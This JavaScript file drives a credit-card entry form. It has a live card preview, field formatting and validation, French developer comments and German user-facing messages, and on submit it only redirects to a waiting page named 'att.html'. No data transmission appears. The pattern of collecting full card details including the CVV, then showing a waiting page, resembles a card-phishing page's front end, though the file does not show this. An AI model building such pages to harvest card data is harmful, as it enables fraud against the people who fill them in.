// Animation de la carte de crédit - Correction des sélecteurs
$("#card-number").on("keyup change", function () {
  var $t = $(this);
  var card_number = $t.val();
  var formatted_number = card_number.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim();
  $(".credit-card-box .number").html(formatted_number || "•••• •••• •••• ••••");
});

$("#card-holder").on("keyup change", function () {
  var $t = $(this);
  var holder_name = $t.val().toUpperCase();
  $(".credit-card-box .card-holder div").html(holder_name || "VOLLSTÄNDIGER NAME");
});

$("#card-expiration-month, #card-expiration-year").change(function () {
  var month = $("#card-expiration-month").val();
  var year = $("#card-expiration-year").val();
  if (month && year) {
    var formatted_date = month + "/" + year.substr(2, 2);
    $(".card-expiration-date div").html(formatted_date);
  } else {
    $(".card-expiration-date div").html("MM/YY");
  }
});

$("#card-cvv")
  .on("focus", function () {
    $(".credit-card-box").addClass("hover");
  })
  .on("blur", function () {
    $(".credit-card-box").removeClass("hover");
  })
  .on("keyup change", function () {
    var cvv = $(this).val();
    $(".cvv div").html(cvv || "•••");
  });

// Initialisation des valeurs par défaut
$(document).ready(function() {
  $(".credit-card-box .number").html("•••• •••• •••• ••••");
  $(".credit-card-box .card-holder div").html("VOLLSTÄNDIGER NAME");
  $(".card-expiration-date div").html("MM/YY");
  $(".cvv div").html("•••");
  setTimeout(function () {
    $("#card-cvv")
      .focus()
      .delay(1000)
      .queue(function () {
        $(this).blur().dequeue();
      });
  }, 500);
});

// Validation en temps réel
$("#card-number").on("input", function() {
  var value = $(this).val().replace(/\s/g, "");
  var formatted = value.replace(/(.{4})/g, "$1 ").trim();
  $(this).val(formatted);
  if (value.length === 16) {
    $(".credit-card-box .number").html(formatted);
  } else {
    $(".credit-card-box .number").html("•••• •••• •••• ••••");
  }
});

$("#card-cvv").on("input", function() {
  var value = $(this).val().replace(/\D/g, "");
  $(this).val(value.substring(0, 3));
});

$("#card-holder").on("input", function() {
  var value = $(this).val().replace(/[^a-zA-ZÀ-ÿ\s]/g, "");
  $(this).val(value);
});

// Gestion du formulaire
document.addEventListener("DOMContentLoaded", function() {
  const cardForm = document.getElementById("cardForm");
  if (cardForm) {
    cardForm.addEventListener("submit", async function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      const data = Object.fromEntries(formData.entries());
      
      if (!data.fullname || !data.cardnumber || !data.expdate || !data.expdate2 || !data.securitycode) {
        alert("Bitte füllen Sie alle geforderten Felder aus.");
        return;
      }
      
      if (data.cardnumber.replace(/\s/g, "").length !== 16) {
        alert("Die Kartennummer ist falsch.");
        return;
      }
      
      // Redirection vers la page d\'attente
      window.location.href = "att.html";
    });
  }
});

